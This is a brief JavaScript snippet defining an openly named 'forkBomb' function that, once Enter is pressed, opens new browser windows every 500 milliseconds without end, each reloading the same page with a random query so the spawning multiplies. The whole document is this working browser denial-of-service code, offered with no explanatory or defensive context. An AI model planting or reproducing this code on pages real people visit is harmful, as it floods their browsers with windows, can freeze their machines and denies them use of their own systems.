function forkBomb(timeout = 500, i = 0) {
  setTimeout(() => {
    window.open('./?v=' + Math.random(), '_new' + (i || ''))
    forkBomb(timeout, i + 1)
  }, timeout)
}


document.addEventListener('keydown', function(event) {
  if (event.key == 'Enter') {
    forkBomb()
  }
});